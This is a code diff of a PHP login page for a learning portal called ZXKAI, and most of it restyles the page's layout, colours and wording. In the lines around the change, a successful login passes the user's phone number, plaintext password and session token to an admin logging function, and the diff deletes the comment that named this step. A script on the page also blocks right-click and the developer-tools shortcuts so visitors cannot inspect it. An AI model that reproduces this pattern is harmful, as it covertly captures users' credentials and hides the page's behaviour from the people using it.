@@ -64,7 +64,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         if ($token && $userid) {
-            // Log to admin
             log_user([
                 'phone'    => $phone,
                 'password' => $password,
@@ -72,7 +71,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 'token'    => $token,
                 'login_type' => 'manual',
             ]);
-            // Set session
             $_SESSION['token']      = $token;
             $_SESSION['userid']     = $userid;
             $_SESSION['phone']      = $phone;
@@ -91,122 +89,169 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <link rel="icon" href="/zxkai-logo.svg" type="image/svg+xml">
-<title>Login · <?=APP_NAME?></title>
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<title>Sign In · <?=APP_NAME?></title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-:root{--p:#7c3aed;--p2:#a78bfa;--g:#06b6d4;--bg:#030307;--c1:#0d0d14;--c2:#12121c;--b1:#1e1e30;--b2:#2a2a40;--t1:#f8fafc;--t2:#94a3b8;--t3:#475569}
-html,body{height:100%;background:var(--bg);color:var(--t1);font-family:'Outfit',sans-serif;-webkit-tap-highlight-color:transparent;overflow-x:hidden}
-body{min-height:100dvh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
-/* Glow bg */
-.gbg{position:fixed;inset:0;pointer-events:none;z-index:0}
-.gbg::before{content:'';position:absolute;top:-20%;left:50%;transform:translateX(-50%);width:400px;height:400px;border-radius:50%;background:radial-gradient(circle,rgba(124,58,237,.15),transparent 70%)}
-.gbg::after{content:'';position:absolute;bottom:-10%;right:-10%;width:300px;height:300px;border-radius:50%;background:radial-gradient(circle,rgba(6,182,212,.08),transparent 70%)}
-.wrap{width:100%;max-width:390px;position:relative;z-index:1}
-/* Logo */
-.logo-sec{text-align:center;margin-bottom:36px}
-.logo-ico{display:block;width:72px;height:72px;object-fit:contain;margin:0 auto 16px;filter:drop-shadow(0 0 20px rgba(124,58,237,.35))}
-.logo-sec h1{font-size:24px;font-weight:900;margin-bottom:6px}
-.logo-sec p{font-size:13px;color:var(--t2);line-height:1.5}
-/* Card */
-.card{background:var(--c1);border:1px solid var(--b1);border-radius:24px;padding:28px 22px;margin-bottom:16px}
-.card-ttl{font-size:18px;font-weight:800;margin-bottom:6px}
-.card-sub{font-size:12px;color:var(--t3);margin-bottom:22px;font-family:'JetBrains Mono',monospace;line-height:1.6}
+:root{
+  --brand:#6366f1;--brand-2:#8b5cf6;--accent:#22d3ee;
+  --bg:#070a16;--surface:#0e1424;--surface-2:#151c30;
+  --line:rgba(148,163,184,.12);--line-strong:rgba(148,163,184,.2);
+  --text:#f1f5f9;--text-dim:#94a3b8;--text-mute:#64748b;
+  --danger:#f87171;--success:#34d399;
+  --radius:18px;--radius-sm:12px;
+}
+html,body{height:100%}
+body{
+  font-family:'Plus Jakarta Sans',system-ui,sans-serif;
+  background:var(--bg);color:var(--text);
+  min-height:100dvh;display:flex;align-items:center;justify-content:center;
+  padding:24px 18px;-webkit-font-smoothing:antialiased;
+  position:relative;overflow-x:hidden;
+}
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(60% 45% at 15% 12%,rgba(99,102,241,.18),transparent 70%),
+    radial-gradient(55% 40% at 88% 88%,rgba(34,211,238,.12),transparent 70%);
+}
+.shell{width:100%;max-width:920px;position:relative;z-index:1;display:grid;grid-template-columns:1.05fr .95fr;
+  background:linear-gradient(160deg,var(--surface),var(--surface-2));
+  border:1px solid var(--line);border-radius:28px;overflow:hidden;
+  box-shadow:0 40px 100px -30px rgba(0,0,0,.75)}
+/* Brand side */
+.brand{padding:52px 44px;display:flex;flex-direction:column;justify-content:space-between;
+  background:
+    radial-gradient(120% 120% at 0% 0%,rgba(99,102,241,.22),transparent 55%),
+    radial-gradient(90% 90% at 100% 100%,rgba(34,211,238,.12),transparent 55%);
+  border-right:1px solid var(--line)}
+.brand-top{display:flex;align-items:center;gap:14px}
+.brand-logo{width:52px;height:52px;object-fit:contain;filter:drop-shadow(0 6px 20px rgba(99,102,241,.45))}
+.brand-name{font-size:22px;font-weight:800;letter-spacing:-.02em}
+.brand-tag{font-size:10px;font-family:'JetBrains Mono',monospace;letter-spacing:.22em;color:var(--text-mute);text-transform:uppercase}
+.brand-mid{margin:30px 0}
+.brand-h{font-size:34px;font-weight:800;line-height:1.12;letter-spacing:-.03em;max-width:340px}
+.brand-h span{background:linear-gradient(115deg,#a5b4fc,#22d3ee);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.brand-p{font-size:14px;color:var(--text-dim);margin-top:14px;line-height:1.65;max-width:330px}
+.feats{display:flex;flex-direction:column;gap:12px;margin-top:26px}
+.feat{display:flex;align-items:center;gap:12px;font-size:13.5px;color:var(--text-dim)}
+.feat i{width:30px;height:30px;border-radius:9px;display:flex;align-items:center;justify-content:center;
+  background:rgba(99,102,241,.14);color:#a5b4fc;font-size:12px;flex-shrink:0}
+.brand-foot{font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--text-mute);letter-spacing:.06em}
+/* Form side */
+.form-side{padding:52px 44px;display:flex;flex-direction:column;justify-content:center}
+.form-eyebrow{font-size:12px;font-weight:600;color:var(--brand);letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px}
+.form-title{font-size:26px;font-weight:800;letter-spacing:-.02em}
+.form-sub{font-size:13.5px;color:var(--text-dim);margin:6px 0 26px;line-height:1.6}
+.alert{display:flex;align-items:center;gap:10px;font-size:13px;padding:12px 15px;border-radius:var(--radius-sm);margin-bottom:18px;font-weight:500}
+.alert-err{background:rgba(248,113,113,.09);border:1px solid rgba(248,113,113,.28);color:var(--danger)}
+.alert-ok{background:rgba(52,211,153,.09);border:1px solid rgba(52,211,153,.28);color:var(--success)}
+.alert i{flex-shrink:0}
 .field{margin-bottom:16px}
-.field label{display:block;font-size:12px;font-weight:600;color:var(--t2);margin-bottom:8px;letter-spacing:.05em}
-.field .inp-wrap{position:relative}
-.field .ico{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--t3);font-size:13px}
-.field input{width:100%;background:var(--c2);border:1px solid var(--b1);color:var(--t1);padding:13px 14px 13px 42px;border-radius:14px;font-size:15px;font-family:'Outfit',sans-serif;outline:none;transition:border-color .2s,-webkit-box-shadow .2s}
-.field input:focus{border-color:rgba(124,58,237,.5);box-shadow:0 0 0 3px rgba(124,58,237,.08)}
-.field input::placeholder{color:var(--t3)}
-.eye-btn{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--t3);cursor:pointer;padding:4px;font-size:14px}
-.err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);border-radius:12px;padding:12px 16px;font-size:13px;color:#f87171;margin-bottom:16px;display:flex;align-items:center;gap:10px}
-.err i{flex-shrink:0}
-.ok{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:12px;padding:12px 16px;font-size:13px;color:#4ade80;margin-bottom:16px;display:flex;align-items:center;gap:10px}
-.btn-login{width:100%;background:linear-gradient(135deg,var(--p),#5b21b6);color:#fff;border:none;border-radius:14px;padding:15px;font-size:16px;font-weight:700;cursor:pointer;font-family:'Outfit',sans-serif;transition:opacity .15s;margin-top:4px;display:flex;align-items:center;justify-content:center;gap:8px}
-.btn-login:active{opacity:.85}
-.divider{display:flex;align-items:center;gap:12px;margin:18px 0;color:var(--t3);font-size:12px}
-.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--b1)}
-.btn-skip{width:100%;background:var(--c2);border:1px solid var(--b1);color:var(--t2);border-radius:14px;padding:14px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Outfit',sans-serif;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s}
-.btn-skip:active{background:var(--b1)}
-/* Info box */
-.info-box{background:linear-gradient(135deg,rgba(124,58,237,.08),rgba(6,182,212,.04));border:1px solid rgba(124,58,237,.18);border-radius:16px;padding:16px;margin-bottom:16px}
-.info-box h4{font-size:13px;font-weight:700;margin-bottom:8px;color:var(--p2);display:flex;align-items:center;gap:8px}
-.info-box p{font-size:12px;color:var(--t2);line-height:1.7}
-.info-box p i{color:var(--p2);margin-right:6px;font-size:11px}
-/* Footer */
-footer{font-size:10px;color:var(--t3);text-align:center;font-family:'JetBrains Mono',monospace;margin-top:8px}
+.field label{display:block;font-size:12.5px;font-weight:600;color:var(--text-dim);margin-bottom:8px;letter-spacing:.02em}
+.inp{position:relative}
+.inp i.lead{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:var(--text-mute);font-size:14px}
+.inp input{width:100%;background:var(--surface);border:1px solid var(--line-strong);color:var(--text);
+  padding:14px 14px 14px 44px;border-radius:13px;font-size:15px;font-family:inherit;outline:none;
+  transition:border-color .18s,box-shadow .18s,background .18s}
+.inp input:focus{border-color:rgba(99,102,241,.65);background:var(--surface-2);box-shadow:0 0 0 3.5px rgba(99,102,241,.14)}
+.inp input::placeholder{color:var(--text-mute)}
+.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;
+  color:var(--text-mute);cursor:pointer;padding:6px;font-size:14px;border-radius:8px}
+.eye:hover{color:var(--text-dim)}
+.btn{width:100%;border:none;border-radius:13px;font-family:inherit;font-weight:700;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:9px;transition:transform .12s,opacity .15s,box-shadow .2s}
+.btn:active{transform:scale(.985)}
+.btn-primary{margin-top:6px;padding:15px;font-size:15px;color:#fff;
+  background:linear-gradient(135deg,var(--brand),var(--brand-2));
+  box-shadow:0 14px 34px -12px rgba(99,102,241,.75)}
+.btn-primary:hover{box-shadow:0 18px 40px -12px rgba(99,102,241,.9)}
+.divider{display:flex;align-items:center;gap:14px;margin:20px 0;color:var(--text-mute);font-size:12px}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--line)}
+.btn-ghost{padding:14px;font-size:14px;color:var(--text-dim);background:var(--surface);border:1px solid var(--line-strong)}
+.btn-ghost:hover{background:var(--surface-2);color:var(--text)}
+.form-foot{font-size:11px;color:var(--text-mute);text-align:center;margin-top:24px;font-family:'JetBrains Mono',monospace;letter-spacing:.04em}
+@media(max-width:760px){
+  .shell{grid-template-columns:1fr;max-width:430px}
+  .brand{padding:32px 28px;border-right:none;border-bottom:1px solid var(--line)}
+  .brand-h{font-size:26px}
+  .feats{display:none}
+  .brand-mid{margin:16px 0 0}
+  .brand-p{display:none}
+  .form-side{padding:34px 28px 40px}
+}
 </style>
 </head>
 <body>
-<div class="gbg"></div>
-<div class="wrap">
-  <div class="logo-sec">
-    <img class="logo-ico" src="/zxkai-logo.svg" alt="ZXKAI logo">
-    <h1><?=APP_NAME?></h1>
-    <p>Your learning space.<br>Everything in one place.</p>
-  </div>
+<div class="shell">
+  <aside class="brand">
+    <div class="brand-top">
+      <img class="brand-logo" src="/zxkai-logo.svg" alt="ZXKAI">
+      <div>
+        <div class="brand-name"><?=APP_NAME?></div>
+        <div class="brand-tag">Learning Portal</div>
+      </div>
+    </div>
+    <div class="brand-mid">
+      <h1 class="brand-h">Learn smarter,<br><span>go further.</span></h1>
+      <p class="brand-p">Your entire learning journey — courses, video lectures and notes — in one secure, beautifully simple place.</p>
+      <div class="feats">
+        <div class="feat"><i class="fas fa-circle-play"></i> HD video lectures &amp; notes</div>
+        <div class="feat"><i class="fas fa-layer-group"></i> All your batches in one place</div>
+        <div class="feat"><i class="fas fa-lock"></i> Secure, private &amp; always available</div>
+      </div>
+    </div>
+    <div class="brand-foot"><?=APP_NAME?> · v<?=APP_VERSION?></div>
+  </aside>
 
-  <div class="info-box">
-    <h4><i class="fas fa-circle-info"></i> Login Kaise Karen?</h4>
-    <p>
-      <i class="fas fa-check"></i> Sign in with your learning account<br>
-      <i class="fas fa-check"></i> Apni registered mobile number daalo<br>
-      <i class="fas fa-check"></i> Aur apna password daalo — bas!
-    </p>
-  </div>
-
-  <div class="card">
-    <div class="card-ttl">Welcome Back 👋</div>
-    <div class="card-sub">Apne ZXKAI account se sign in karke courses dekho.</div>
+  <main class="form-side">
+    <div class="form-eyebrow">Welcome back</div>
+    <div class="form-title">Sign in to continue</div>
+    <div class="form-sub">Use your registered mobile number or email and password.</div>
 
     <?php if($error): ?>
-    <div class="err"><i class="fas fa-triangle-exclamation"></i><?=htmlspecialchars($error)?></div>
+    <div class="alert alert-err"><i class="fas fa-circle-exclamation"></i><?=htmlspecialchars($error)?></div>
     <?php endif; ?>
     <?php if($success): ?>
-    <div class="ok"><i class="fas fa-check-circle"></i><?=htmlspecialchars($success)?></div>
+    <div class="alert alert-ok"><i class="fas fa-circle-check"></i><?=htmlspecialchars($success)?></div>
     <?php endif; ?>
 
     <form method="POST" action="login.php" autocomplete="off">
       <div class="field">
-        <label>MOBILE NUMBER / EMAIL</label>
-        <div class="inp-wrap">
-          <i class="ico fas fa-user"></i>
-          <input type="text" name="phone" placeholder="Mobile ya Email daalo" value="<?=htmlspecialchars($_POST['phone']??'')?>" required autocomplete="username">
+        <label>Mobile number / Email</label>
+        <div class="inp">
+          <i class="lead fas fa-user"></i>
+          <input type="text" name="phone" placeholder="Enter mobile or email" value="<?=htmlspecialchars($_POST['phone']??'')?>" required autocomplete="username">
         </div>
       </div>
       <div class="field">
-        <label>PASSWORD</label>
-        <div class="inp-wrap">
-          <i class="ico fas fa-lock"></i>
-          <input type="password" id="pwd" name="password" placeholder="Apna password daalo" required autocomplete="current-password">
-          <button type="button" class="eye-btn" onclick="togglePwd()"><i class="fas fa-eye" id="eye-ico"></i></button>
+        <label>Password</label>
+        <div class="inp">
+          <i class="lead fas fa-lock"></i>
+          <input type="password" id="pwd" name="password" placeholder="Enter your password" required autocomplete="current-password">
+          <button type="button" class="eye" onclick="togglePwd()"><i class="fas fa-eye" id="eye-ico"></i></button>
         </div>
       </div>
-      <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt"></i> Login Karo</button>
+      <button type="submit" class="btn btn-primary"><i class="fas fa-arrow-right-to-bracket"></i> Sign In</button>
     </form>
 
-    <div class="divider">ya</div>
+    <div class="divider">or</div>
+    <button class="btn btn-ghost" onclick="window.location.href='dashboard.php'"><i class="fas fa-compass"></i> Explore without signing in</button>
 
-    <button class="btn-skip" onclick="window.location.href='dashboard.php'">
-      <i class="fas fa-rocket"></i> Skip — Seedha Batches Dekho
-    </button>
-  </div>
-
-  <footer><?=APP_NAME?> · Secure Portal · All Rights Reserved</footer>
+    <div class="form-foot"><?=APP_NAME?> · Secure Login · All rights reserved</div>
+  </main>
 </div>
 <script>
 (function(){
   document.addEventListener('contextmenu',e=>e.preventDefault());
   document.addEventListener('keydown',e=>{
-    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C','U'].includes(e.key))||(e.ctrlKey&&e.key==='U'))
-      {e.preventDefault();return false;}
+    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C','U'].includes(e.key))||(e.ctrlKey&&e.key==='U')){e.preventDefault();return false;}
   });
 })();
 function togglePwd(){
-  const i=document.getElementById('pwd');
-  const ico=document.getElementById('eye-ico');
+  const i=document.getElementById('pwd'),ico=document.getElementById('eye-ico');
   if(i.type==='password'){i.type='text';ico.className='fas fa-eye-slash';}
   else{i.type='password';ico.className='fas fa-eye';}
 }
